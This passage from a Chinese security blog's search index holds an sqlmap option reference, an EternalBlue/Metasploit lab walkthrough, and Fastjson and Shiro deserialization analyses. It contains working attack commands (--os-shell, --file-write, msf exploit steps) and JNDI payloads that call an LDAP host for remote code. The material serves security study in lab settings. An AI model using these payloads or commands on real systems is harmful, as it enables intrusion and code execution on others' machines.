“http://192.168.48.130/sqlmap/mysql/get_int.php?id=1” –schema–batch –exclude-sysdbs\n11.2 枚举数据表数量 如果用户只想知道表中的条目数，则可以使用此开关。 –count\npython sqlmap.py -u “http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1” –count -D testdb\n11.3 获取数据信息 –start, –stop, –first, –last\n–start 1 –stop3 获取第二张到第三张表的名字 –stop 1 获取第一张表的名字 –first 3 –last 5 获取从第三出发到第五个字符\n11.4 设置条件获取信息 –pivot-column=id 设置独一无二的列 –where=“id\u0026gt;3” 设置条件\n11.5 暴力激活成功教程数据 使用场景：Mysql\u0026lt;5.0时，Mysql中没有元数据库 information_schema。 –common-tables 暴力激活成功教程表名 –common-columns 暴力激活成功教程列名\n11.6 读取文件 前提：已知目标主机文件路径 –file-read 路径 读取对应文件内容。 注意：此处路径为绝对路径。（需要使用//,其中一个/表示转义）\n11.7 写入文件 –file-write 读取本地文件 –file-dest 将读取到的文件写入到远程绝对路径\n11.8 检索所有信息 -a –all\n0x0C sqlmap 系统参数 12.1 执行系统命令 前提条件：\n网站必须是root权限 攻击者需要知道网站的绝对路径 GPC为off（即magic_quotes_gpc = off），php主动转义的功能关闭 若需要上传文件，则secure_file_priv 不为NULL –os-shell\n12.2 结合Metasploit python sqlmap.py -u “注入点” –os-pwn –msf-path (若不使用该参数，则自动选择默认路径) （只适用于MySQL and PostgreSQL 数据库）\n12.3 注册表介绍 注册表（Registry，繁体中文版Windows操作系统称之为登录档）是Microsoft Windows中的一个重要的数据库，用于存储系统和应用程序的设置信息。早在Windows 3.0推出OLE技术的时候，注册表就已经出现。随后推出的Windows NT是第一个从系统级别广泛使用注册表的操作系统。但是，从Microsoft Windows 95操作系统开始，注册表才真正成为Windows用户经常接触的内容，并在其后的操作系统中继续沿用至今。\n12.4 注册表操作 –reg-read –reg-add –reg-del –reg-key, –reg-value, –reg-data –reg-type\n例如： $ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 –reg-add –reg-key=“HKEY_LOCAL_MACHINE\\SOFTWARE\\sqlmap” –reg-value=Test –reg-type=REG_SZ –reg-data=1\n0x0D sqlmap 通用参数（一） 13.1 加载 sqlite 会话文件 sqlmap自动为每个目标创建持久会话SQLite文件，位于专用输出目录中，其中存储会话恢复所需的所有数据。如果用户想显式地设置会话文件位置(例如在一个位置为多个目标存储会话数据)，可以使用此选项。\n-s “会话文件”\n13.2 加载 http 文本文件 这个选项需要指定文本文件的参数来写入sqlmap – HTTP(s)请求和HTTP(s)响应生成的所有HTTP(s)流量。 这主要用于调试目的——当您向开发人员提供一个潜在的bug报告时，也发送这个文件。 -t 参数\n13.3 设置默认选择选项 如果希望sqlmap作为批处理工具运行，在sqlmap需要时不需要任何用户交互，那么可以使用—–batch来强制执行。这将使sqlmap在需要用户输入时保持默认行为。\n13.4 执行系统命令 –os-cmd=”命令”\n13.5 设置盲注字符集 在基于布尔和基于时间的SQL盲注中，用户可以强制使用自定义字符集来加速数据检索过程。\n例如，如果转储消息摘要值(例如SHA1)，则使用–charset=“0123456789abcdef”，预期请求数量比正常运行少30%左右\n13.6 爬取 URL sqlmap可以通过从目标位置开始收集链接(爬行)来收集潜在的脆弱链接。使用此选项，用户可以设置一个深度(到起始位置的距离)，低于这个深度，sqlmap不会进入收集阶段，因为只要有新的链接要访问，就会递归地执行这个过程。 –crawl python sqlmap.py -u “http://192.168.21.128/sqlmap/mysql/” –batch –crawl=3 –crawl-exclude 字符串 存在字符串的URL不进行爬取\n13.7 在 CSV 输入中使用的分割字符 当被转储的数据存储到CSV格式(–dump-format=CSV)时，条目必须用“分离值”分隔(默认值是 ”，”)。如果用户想要覆盖它的默认值，他可以使用这个选项(例如–csv-del=”@”)。\n13.8 设置输出格式 当将转储表数据存储到输出目录中的相应文件中时，sqlmap支持三种不同的格式:CSV、HTML和SQLITE。默认的是CSV，其中每个表行一行一行地存储在文本文件中，每个条目用逗号分隔(或提供了选项–csv-del)。对于HTML，输出被存储到一个HTML文件中，其中每一行都用格式化表中的一行表示。对于SQLITE，输出存储在SQLITE数据库中，原始表内容复制到同名的相应表中。\n–dump-format\n13.9 探测之前检测 Internet 连接 在进行评估目标之前，检测当前计算机Internet连接是否正常。确保探测失败不是因为网路拦截问题。\n–check-internet\n13.10 解析和测试表单的输入字段 –form\n0x0E sqlmap 通用参数（二） 14.1 设置预计完成时间 可以实时地计算和显示估计的到达时间，以检索每个查询输出。当用于检索输出的技术是任何盲SQL注入类型时，就会显示这一点。 –eta\n14.2 刷新会话文件 由于会话文件的概念，所以最好知道您可以使用选项–flush-session刷新该文件的内容。通过这种方式，您可以避免sqlmap中默认实现的缓存机制。其他可能的方法是手动删除会话文件。\n14.3 忽略会话中的存储结果 使用选项–fresh-queries来忽略该文件的内容。通过这种方式，可以保持会话文件不变，对于所选的运行，避免恢复/恢复查询输出。\n14.4 使用 Hex 函数检索数据 非ascii数据的检索需要特殊的需求。解决这个问题的一个方法是使用DBMS hex函数。数据在被检索之前被编码为十六进制形式，然后被未编码为原始形式。\n–hex\n例如： python sqlmap.py -u “http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1” –hex -v 3 –batch\n14.5 设置自定义输出路径 sqlmap默认将会话和结果文件存储在子目录输出中。如果您想使用不同的位置，可以使用这个选项(例如–output-dir=/tmp)。\n14.6 从响应页面解析错误 如果web应用程序配置为调试模式，以便在HTTP响应中显示后端数据库管理系统错误消息，sqlmap可以解析并显示它们。这对于调试很有用，比如理解为什么某个枚举或接管开关不起作用——这可能与会话用户的特权有关 –parse-error\n保存Sqlmap配置文件 –save 可以将命令行选项保存到配置INI文件中。然后，可以使用之前解释的-c选项编辑生成的文件并将其传递给sqlmap。\n更新Sqlmap –update\n14.7 强制设置 DBMS 编码 –encoding=”gbk”\n14.8 存储 HTTP 流量到 HAR –har=”HARFILE” HAR（HTTP Archive），是一个用来储存HTTP请求/响应信息的通用文件格式，基于JSON。\n14.9 筛选具体 Payload –test-filter=”ROW”\n14.10 过滤具体 Payload –test-skip=”BENCHMARK”\n补充： 针对proxy日志文件使用正则表达式筛选目标 –scope=”regex”\n0x0F sqlmap 杂项参数 15.1 使用缩写助记符 Sqlmap提供灵活的缩写助记符来进行快速书写命令。 -z 参数\n例如： python sqlmap.py –batch –random-agent –ignore-proxy –technique=BEU -uwww.target.com/vuln.php?id=1″\n使用助记符： python sqlmap.py -z “bat,randoma,ign,tec=BEU” -u “www.target.com/vuln.php?id=1”\n15.2 设置探测预警 在发现SQL注入漏洞时，运行本机主机系统命令 –alert\n15.3 设置问题答案 如果用户想自动设置问题的答案，即使使用–batch，使用–answers，通过在等号后面提供问题的任何部分和答案来完成。另外，不同问题的答案可以用分隔符分隔。\n例如： python sqlmap.py -u “http://192.168.22.128/sqlmap/mysql/get_int.php?id=1”–technique=E –answers=“extending=N” –batch\n15.4 发现 SQL 注入预警 如果用户使用–beep，当发现SQL注入时，会立即发出哔哔的警告。这在需要测试的大量目标url(选项-m)时特别有用。\n15.5 其他 –cleanup 清除DBMS udf创建的数据表 –dependencies 查看依赖项 –disable-coloring 不进行高亮显示 –identify-waf 查看是否具有WAF保护 –moblie 使用手机端User-Agent –purge-output 清除output目录下的文件 –skip-waf 绕过WAF –sqlmap-shell 使用sqlmap shell –tmp-dir=TMPDIR 指定本地目录用来存储临时文件 –web-root=WEBROOT 指定站点根目录 –wizard 使用向导式的sqlmap –gpage=GOOGLEPAGE 设置Google Dork的页码数\n–smart 智能探测 有些情况下，用户有大量的潜在目标URL（例如，提供了选项 -m），希望尽快找到一个脆弱的目标。如果使用—smart，那么将在扫描中进一步使用数据库管理系统错误的参数，否则就跳过它们\n0x10 常用 Tamper 脚本 这里推荐几篇比较详细的文章去学习： https://www.cnblogs.com/mark0/p/12349551.html\nhttps://blog.csdn.net/qq_34444097/article/details/82717357?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159341834119725219951313%2522%252C%2522scm%2522%253A%252220140713.130102334…%2522%257D\u0026amp;request_id=159341834119725219951313\u0026amp;biz_id=0\u0026amp;utm_medium=distribute.pc_search_result.none-task-blog-2allfirst_rank_ecpm_v1~pc_rank_v3-5-82717357.first_rank_ecpm_v1_pc_rank_v3\u0026amp;utm_term=sqlmap+tamper脚本\n版权声明：本文内容由互联网用户自发贡献，该文观点仅代表作者本人。本站仅提供信息存储空间服务，不拥有所有权，不承担相关法律责任。如发现本站有涉嫌侵权/违法违规的内容， 请发送邮件至 举报，一经查实，本站将立刻删除。\n发布者：全栈程序员栈长，转载请注明出处：https://javaforall.cn/200744.html原文链接：https://javaforall.cn\n","permalink":"http://localhost:1313/xvsf/posts/sqlmap%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/","summary":"\u003ch1 id=\"sqlmap命令详解\"\u003esqlmap命令详解\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e转载自： \u003ca href=\"https://cloud.tencent.com/developer/user/8223537\"\u003e全栈程序员站长\u003c/a\u003e      原文：https://cloud.tencent.com/developer/article/2148285\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"0x01-sqlmap-确定目标\"\u003e0x01 sqlmap 确定目标\u003c/h2\u003e\n\u003ch3 id=\"11-直连数据库\"\u003e1.1 直连数据库\u003c/h3\u003e\n\u003cp\u003esqlmap支持直接连接数据库，通过以下命令来直连\u003c/p\u003e","title":"sqlmap命令详解"},{"content":"概述： 永恒之蓝（英语：EternalBlue）是美国国家安全局开发的漏洞利用程序，于2017年4月14日被黑客组织影子掮客泄漏。该工具利用445/TCP端口的文件分享协议的漏洞进行散播。\n尽管微软于2017年3月14日已发布补丁修复该漏洞，但在5月12日WannaCry勒索软件利用此漏洞传播时，大量未安装补丁的用户仍然受害。\n鉴于WannaCry的严重性，微软罕见地为已终止支持的Windows XP、Windows 8和Windows Server 2003发布了紧急安全更新。\n2017年6月27日，勒索软件NotPetya再次利用永恒之蓝漏洞在欧洲传播。与普通勒索软件不同，NotPetya以破坏而非勒索为目的，即使支付赎金也无法恢复文件。真正的Petya作者随后公布了解密密钥，并声明与此次攻击无关。\n原理： 永恒之蓝利用的是Windows系统文件共享功能中一个严重的远程代码执行漏洞。攻击者无需用户名和密码，只要目标机器的445端口是开放的，就可以通过网络直接发送一段精心构造的数据包，在目标系统上执行任意代码。\n核心漏洞：SMBv1 协议中的“缓冲区溢出” 永恒之蓝攻击的是Windows的SMBv1 服务器消息块协议。这个协议主要用于网络上的文件共享、打印机共享等。漏洞的核心是一个经典的 缓冲区溢出 漏洞。\n什么是缓冲区？\n我们可以把缓冲区想象成一个有固定容量的“容器”或“货架”，用来临时存放程序处理的数据。 溢出是如何发生的？\n在SMBv1协议处理特定的SMB请求（尤其是与文件事务相关的SMBv1 TRANS2请求）时，程序没有正确地检查用户输入数据的长度。 攻击者构造一个超长的、畸形的数据包。 当Windows系统收到这个数据包时，会按照SMB协议去解析它。 由于没有进行长度校验，这个超长的数据会“撑爆”系统预先分配好的那个“缓冲区”，导致多出来的数据覆盖到旁边内存区域。 关键步骤：从溢出到控制 仅仅让程序崩溃（造成蓝屏）不是攻击者的目的，他们的目标是控制你的电脑。永恒之蓝通过以下精妙的步骤实现了这一点：\n覆盖关键数据，劫持程序流程：\n被“撑爆”的缓冲区旁边的内存区域，存放着一些关键数据，比如函数返回地址。攻击者精心设计溢出数据，用他们指定的一个内存地址去覆盖这个返回地址。 利用“Shellcode”执行命令：\n在溢出的数据中，攻击者会嵌入一小段恶意代码，称为 “Shellcode” 。这段代码的功能通常是：下载并执行勒索软件（如WannaCry）的后端负载，或者在系统上开一个具有高权限的后门。 触发漏洞，跳转到攻击代码：\n当被攻击的程序（SMB服务）处理完这个畸形数据包，准备返回时，它会去读取那个被覆盖的“返回地址”。这个地址现在指向的是攻击者安排的位置。 内核态权限提升：\n这里是最精妙也最危险的一步。永恒之蓝利用了一个名为 “DoublePulsar” 的后门。在溢出发生后，Shellcode并不会直接在用户权限下运行，而是利用Windows内核中的一个机制，将执行流程切换到内核模式。 用户模式：普通程序的运行级别，权限受限。 内核模式：操作系统的核心运行级别，拥有对系统的完全控制权。\n通过一个精心构造的“任意写入”原语，攻击者可以将自己的Shellcode注入到内核空间，并提升其权限，使其以系统最高权限执行。 攻击流程总结 一个完整的永恒之蓝攻击可以概括为以下几步：\n扫描：攻击者在网络上扫描开放了445端口的Windows机器。 发送恶意包：向目标机器的445端口发送利用SMBv1缓冲区溢出漏洞的精心构造的数据包。 触发溢出：目标系统的SMB服务处理该数据包，发生缓冲区溢出，关键内存地址被覆盖。 内核提权：利用DoublePulsar技术，将恶意Shellcode注入内核并提升至系统权限。 执行载荷：在内核态执行Shellcode，通常会从攻击者控制的服务器下载并运行最终的恶意软件（如WannaCry勒索病毒）。 横向移动：被攻陷的机器会变成一个跳板，继续在内部网络中扫描和攻击其他存在漏洞的机器，形成链式反应，这也是WannaCry能迅速蔓延全球的原因。 危害 无需用户交互：用户不需要点击任何链接或打开任何文件，只要电脑开机并联网，就可能被攻击。 高权限：直接获取系统内核权限，可以为所欲为。 蠕虫式传播：结合了漏洞利用和蠕虫特性，可以自我复制和传播。 环境： Windows Server 2003 ip: 192.168.126.128 关闭防火墙\nKali ip: 192.168.126.129\nWindows Server 2003\nip地址： 192.168.126.128\n关闭防火墙\nKali\nip a\n192.168.126.129\n漏洞利用： 1.使用nmap扫一下该网段主机的存活情况 nmap -sS 192.168.126.0/24\n找到 IP为：192.168.126.128 的主机开启\n2.扫描该主机端口从1-1000的开放情况 nmap -p 1-1000 192.168.126.128\n3.扫描该主机的操作系统类型 nmap -O 192.168.126.128\n4.扫描该主机上的漏洞 nmap --script=vuln 192.168.126.128\n存在 ms17-010 永恒之蓝\nMetasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。\nMetasploit项目最为知名的子项目是开源的Metasploit框架，一套针对远程主机进行开发和执行“exploit代码”的工具。其他重要的子项目包括Opcode数据库、shellcode档案、安全研究等内容。\nMetasploit项目知名的功能还包括反取证与规避工具，其中的某些工具已经内置在Metasploit Framework里面。\nMetasploit（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。\n它本身附带数百个已知软件漏洞，是一款专业级漏洞攻击工具\n因为只要掌握MSF的使用方法，每个人都可以使用MSF来攻击那些未打过补丁或者刚刚打过补丁的漏洞。\n5.进入工具 msfconsole\n6.搜索相关漏洞 search ms17-010\n7.选择模块 use 10 远程执行代码\n8.显示配置项 show options\n9.设置一下RHOSTS(靶机的ip地址) set RHOSTS 192.168.126.128\n10.执行攻击 run 或者 exploit\n运行成功会出现 meterpreter \u0026gt;\nMeterpreter 是 Metasploit 的一个扩展模块，可以调用 Metasploit 的一些功能，\n对目标系统进行更深入的渗透，如获取屏幕、上传/下载文件、创建持久后门等。\nhelp命令可以查看可以使用哪些命令\nscreenshot\nxdg-open /root/KMSzAlpc.jpeg\nrun vnc\nshell\n预防方案 打开防火墙，安装杀毒软件。 关闭445端口及不必要的服务。 安装对应补丁。 参考文章： https://blog.csdn.net/qq_61839115/article/details/129951295\nhttps://blog.csdn.net/m0_65712192/article/details/127637917\n","permalink":"http://localhost:1313/xvsf/posts/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-%E5%A4%8D%E7%8E%B0/","summary":"\u003ch1 id=\"概述\"\u003e概述：\u003c/h1\u003e\n\u003cp\u003e永恒之蓝（英语：EternalBlue）是美国国家安全局开发的漏洞利用程序，于2017年4月14日被黑客组织影子掮客泄漏。该工具利用445/TCP端口的文件分享协议的漏洞进行散播。\u003c/p\u003e","title":"永恒之蓝 复现"},{"content":" ","permalink":"http://localhost:1313/xvsf/posts/xss_lab/","summary":"\u003c!-- raw HTML omitted --\u003e","title":"xss_lab"},{"content":"FastJson反序列化 基础 官方源码： https://github.com/alibaba/fastjson\n使用手册： https://www.w3cschool.cn/fastjson/\nFastjson是一个Java库，可用于将Java对象转换为它们的JSON表示。它还可以用于将JSON字符串转换为等效的Java对象。Fastjson可以处理任意Java对象，包括没有源代码的预先存在的对象。\nJava 对象和 JSON 字符串互相转换\nplain\r1 2 String jsonStr = JSON.toJSONString(obj); // 对象 → JSON 字符串 MyClass obj = JSON.parseObject(jsonStr, MyClass.class); // JSON 字符串 → 对象 漏洞参考： 1.2.24及以下没有对序列化的类做校验,导致漏洞产生 1.2.25-1.2.41增加了黑名单限制，更改autoType默认为关闭选项。 1.2.42版本是对1.2.41及以下版本的黑名单绕过,代码内更新字符串黑名单hash方式 1.2.43版本是对1.2.42及以下版本的黑名单绕过 1.2.44-1.2.45版本1.2.43版本黑名单无法绕过,寻找新的利用链进行利用 1.2.47版本 利用fastjson处理Class类时的操作,将恶意类加载到缓存中,实现攻击 1.2.62-1.2.67版本Class不会再往缓存中加载恶意类,寻找新的利用链进行突破 1.2.68版本,使用期望类AutoCloseable来绕过fastjson校验 1.2.72-1.2.80使用期望类Throwable的子类,进行绕过\n参考文章： https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/\nhttps://yanghaoi.github.io/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/\nhttps://xz.aliyun.com/t/12728 https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw\nFastjson（TemplatesImpl\u0026amp;JdbcRowSetImpl）\nhttps://mp.weixin.qq.com/s/XPbbgLcBmHE7dmHswY_S3Q\n关于 autoType AutoType 是 Fastjson 的一项功能：当 JSON 里出现特殊字段 @type 时，Fastjson 会把这个字符串当作 Java 类型的全限定名（com.example.Foo），尝试把该 JSON 反序列化为对应的 Java 类实例。换句话说，@type 让 JSON 能直接指定要生成哪个 Java 类的对象 —— 这是“多态反序列化”的一种实现方式。\n@type 能让不受信任的 JSON 指定任意类去实例化。许多 Fastjson 漏洞就是利用了这点（com.sun.rowset.JdbcRowSetImpl ）\n因此，默认全开 AutoType 会把应用暴露给远程任意对象创建和潜在的代码执行。\nFastJson 1.2.24 反序列化链分析 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package com.example.fastjson122.demos.web; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class FastJsonController { public static void main(\tString[] args) { //反序列化基本使用 //1.fastjson 解析变量数据 //Java 字符串里 \u0026#34; 需要转义 String str=\u0026#34;{\\\u0026#34;name\\\u0026#34;:\\\u0026#34;theonefx\\\u0026#34;,\\\u0026#34;age\\\u0026#34;:666}\u0026#34;; // JSON.parseObject(String text) 方法，把 JSON 字符串解析成一个 JSONObject 对象，解析后，Fastjson 会自动把字符串里的 JSON 结构转成 Java 对象 JSONObject data1 = JSON.parseObject(str); //直接输出 JSONObject 对象 System.out.println(data1); //2.fastjson 加入User类解析:传入其他类解析后默认执行 set get类方法 // 在 1.2.25+ 之后默认关闭了 AutoType 功能。主动拒绝了 @type 自动类型反序列化。 String userStr = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.example.fastjson122.demos.web.User\\\u0026#34;,\\\u0026#34;age\\\u0026#34;:22,\\\u0026#34;name\\\u0026#34;:\\\u0026#34;xiaodi\\\u0026#34;}\u0026#34;; JSONObject data2 = JSON.parseObject(userStr); System.out.println(data2); //3.fastjson 加入执行命令解析:FastJson 支持 @type 语法对应类操作 String testStr = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.example.fastjson001.demos.web.Test\\\u0026#34;,\\\u0026#34;cmd\\\u0026#34;:\\\u0026#34;calc\\\u0026#34;}\u0026#34;; JSONObject data3 = JSON.parseObject(testStr); System.out.println(data3); //4.加入Poc类解析:JdbcRowSetImpl类解析后执行setDataSourceName setAutoCommit方法 //注：控制 dataSourceName 值后调 setAutoCommit 触发 connect 里面的 lookup String pocStr = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://169.254.39.1:1389/rfkucd\\\u0026#34;, \\\u0026#34;autoCommit\\\u0026#34;:true}\\n\u0026#34;; JSONObject data4 = JSON.parseObject(pocStr); System.out.println(data4); //触发 fastjson 反序列化用到 JSON.parseObject() \u0026amp; JSON.parse() } } 分析链： 调试分析：\n此处下断点调试\nparseObject 方法调用 parse 方法解析字符串\nparse(text) 是 Fastjson 的底层解析方法。\n它会根据字符串的内容返回不同的对象：\n如果是 {...} → 返回 JSONObject\n如果是 [...] → 返回 JSONArray\n如果是普通值 → 返回 String、Number、Boolean 等。\nJSON.DEFAULT_TYPE_KEY 是一个固定值 @type，一旦判断值为 @type ，就将其认为是类的限定，之后便尝试加载com.sun.rowset.JdbcRowSetImpl 类。即 @type = com.sun.rowset.JdbcRowSetImpl，fastjson 会去加载这个类。\n步入 TypeUtils.loadClass\nconfig 是 ParserConfig 对象，保存了各种类的反序列化器;deserialze 方法的三个参数：\nthis → 当前解析器（DefaultJSONParser），里面有 lexer、上下文等信息。\nclazz → 要生成的 Java 类。\nfieldName → 字段名（如果这是某个字段的值）。\n这个方法会根据 clazz 的结构，从 JSON 中取值，并用反射或类型转换来创建对象并赋值\n在执行反序列化的过程中，变量中出现了 JdbcRowSetImpl\n经过漫长的跟踪，来到了关键点。。（对于一些不重要的判断可以跳过，追踪关键点）\n这是反序列化RCE的触发点，InitialContext 是 JNDI（Java Naming and Directory Interface）的入口类，lookup() 会根据传入的地址去访问远程服务\n总结分析链： parseObject -\u0026gt; parse -\u0026gt; key(@type) -\u0026gt; TypeUtils.loadClass -\u0026gt; ObjectDeserializer -\u0026gt; JdbcRowSetImpl -\u0026gt; connect -\u0026gt; lookup\n结合 传入其他类，解析后默认执行 set get类方法 的结论，当走到 JdbcRowSetImpl.class 中触发了其中的set、get方法，而 setAutoCommit 中恰好有 connect 方法，触发执行了 lookup 方法，而 lookup 方法中 触发了 getDataSourceName ，所以 poc 构造的思路就有了：\n@type : 告诉 Fastjson 将它反序列化成指定的 Java 类，即 \u0026ldquo;com.sun.rowset.JdbcRowSetImpl\u0026rdquo;\ndataSourceName : JDBC 连接的数据源，此处使用 Java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026quot;calc\u0026quot;\nautoCommit : 调用 setAutoCommit(true) ，触发逻辑\nplain\r1 2 3 4 5 6 7 {\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://169.254.39.1:1389/rfkucd\\\u0026#34;, \\\u0026#34;autoCommit\\\u0026#34;:true} --\u0026gt; { \u0026#34;@type\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;: \u0026#34;ldap://169.254.39.1:1389/rfkucd\u0026#34;, \u0026#34;autoCommit\u0026#34;: true } 这样就可以达到 lookup 访问远程服务的目的，造成了反序列化RCE漏洞。\n当然，1.2.24 的漏洞在之后的版本已经被修复，默认不开启 autoType\nFastJson 1.2.25-1.2.47 CC链分析 1、开启 autoType 漏洞利用条件： 开启 AutoTypeSupport\n加 L 和 ;\nplain\r1 2 3 ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String testPoc = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;Lcom.sun.rowset.JdbcRowSetImpl;\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://169.254.39.1:1389/5uppp0\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject test = JSON.parseObject(testPoc); POC 分析\u0026amp;链分析： JSONObject test = JSON.parseObject(testPoc); 断点调试\n判断 key == @type\n步入 checkAutoType，acceptList白名单，这里的 checkAutoType 中acceptList 为空数组，不会匹配白名单，而是进入下方的黑名单\n可以看到先进入黑名单进行判断：\n黑名单依次进行判断\n继续执行。这一步看到判断了 className 的开头和结尾如果分别为L和;，则进入substring\n在执行了 substring 之后，原本的className = Lcom.sun.rowset.JdbcRowSetImpl; 被替换成了 newClassName = com.sun.rowset.JdbcRowSetImpl\n之后同 1.2.24 的反序列化链\n接下来分析不开启 AutoTypeSupport\n来到白名单，autoTypeSupport 判断为 false\n在这一步进行黑名单循环\n判断为异常，报错，结束\n总结分析链： parseObject -\u0026gt; key(@type) -\u0026gt; checkAutoType -\u0026gt; denyList -\u0026gt; substring -\u0026gt; loadClass -\u0026gt; newClassName = com.sun.rowset.JdbcRowSetImpl\n这些版本都是结合黑名单进行构造绕过，比如 加 L 和 ;、加 LL 和 ;;、加 [ 等等，关键点要开启 AutoTypeSupport\n从1.2.41说起。在checkAutotype()函数中，会先检查传入的@type的值是否是在黑名单里，如果要反序列化的类不在黑名单中，那\n么才会对其进行反序列化。问题来了，在反序列化前，会经过loadClass()函数进行处理，其中一个处理方法是：在加载类的时候会去\n掉className前后的L和;。所以，如果我们传入Lcom.sun.rowset.JdbcRowSetImpl;，在经过黑白名单后，在加载类时会去掉前后的\nL和;，就变成了com.sun.rowset.JdbcRowSetImpl，反序列化了恶意类。\n更新了1.2.42，方法是先判断反序列化目标类的类名前后是不是L和;，如果是，那么先去掉L和;，再进行黑白名单校验（偷懒\nqaq）。关于1.2.42绕过非常简单，只需要双写L和;，就可以在第一步去掉L和;后，与1.2.41相同。\n更新也非常随意，在1.2.43中，黑白名单判断前，又增加了一个是否以LL开头的判断，如果以LL开头，那么就直接抛异常，非常随意\n解决了双写的问题。但是除了L和;，FastJson在加载类的时候，不只对L和;这样的类进行特殊处理，[也对特殊处理了，所以，同样的\n方式在前面添加[绕过了1.2.43及之前的补丁。\n在1.2.44中，黑客们烦不烦，来了个狠的：只要你以[开头或者;结尾，我直接抛一个异常。如此，终于解决了缠绵多个版本的漏洞。\n2、checkAutotype绕过 FastJson有一个全局缓存机制：在解析json数据前会先加载相关配置，调用 addBaseClassMappings() 和 loadClass() 函数将一些基础类和第三方库存放到 mappings 中（mappings 是 ConcurrentMap 类，所以我们在一次连接中传入两个键值 a 和 b ，之后在解析时，如果没有开启 autotype，会从 mappings 或 deserializers.findClass() 函数中获取反序列化的对应类，如果有，则直接返回绕过了黑名单。利用的是 java.lang.Class 类，其反序列化处理类 MiscCodec 类可以将任意类加载到 mappings 中，实现了目标。\n第一步利用 java.lang.Class 将恶意类加载到 mappings 中；\n第二步从在 checkAutoType 内部，没有开启 autotype ，直接从 mappings 中获取 mappings 中取出恶意类并绕过黑名单进行了反序列化。\nPOC:\njava\r1 2 3 4 5 6 7 8 9 10 11 testStr={ \u0026#34;a\u0026#34;:{ \u0026#34;@type\u0026#34;:\u0026#34;java.lang.Class\u0026#34;, \u0026#34;val\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34; }, \u0026#34;b\u0026#34;:{ \u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;:\u0026#34;ldap://169.254.39.1:1389/is9aig\u0026#34;, \u0026#34;autoCommit\u0026#34;:true } } ","permalink":"http://localhost:1313/xvsf/posts/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","summary":"\u003ch1 id=\"fastjson反序列化\"\u003eFastJson反序列化\u003c/h1\u003e\n\u003ch2 id=\"基础\"\u003e基础\u003c/h2\u003e\n\u003cp\u003e官方源码： \u003ca href=\"https://github.com/alibaba/fastjson\"\u003ehttps://github.com/alibaba/fastjson\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e使用手册： \u003ca href=\"https://www.w3cschool.cn/fastjson/\"\u003ehttps://www.w3cschool.cn/fastjson/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eFastjson是一个Java库，可用于将Java对象转换为它们的JSON表示。它还可以用于将JSON字符串转换为等效的Java对象。Fastjson可以处理任意Java对象，包括没有源代码的预先存在的对象。\u003c/p\u003e","title":"FastJson反序列化"},{"content":"Shiro反序列化 Shiro反序列化 参考文章： Shiro反序列化漏洞笔记一（原理篇）\n环境搭建 直接从github上clone代码到本地。\nplain\r1 2 3 git clone https://github.com/apache/shiro.git cd shiro git checkout shiro-root-1.2.4 修改 pml.xml（路径为 \\shiro\\samples\\web\\pom.xml）\nxml\r1 2 3 4 5 6 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.servlet\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jstl\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2\u0026lt;/version\u0026gt; \u0026lt;!-- 添加 --\u0026gt; \u0026lt;scope\u0026gt;runtime\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; 之后 maven 搭建，配置 tomcat 环境\n漏洞分析 漏洞分析具体已经在 Java-sec-code 分析过了，就不再重复了：\n逻辑总结：\n当获取用户请求时，大致的关键处理过程如下：\n获取Cookie中rememberMe的值\n对rememberMe进行Base64解码\n使用AES进行解密\n对解密的值进行反序列化\n由于AES加密的Key是硬编码的默认Key，因此攻击者可通过使用默认的Key对恶意构造的序列化数据进行加密，当\nCookieRememberMeManager 对恶意的 rememberMe 进行以上过程处理时，最终会对恶意数据进行反序列化，从而导致反序列化漏洞。\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 @GetMapping(value = 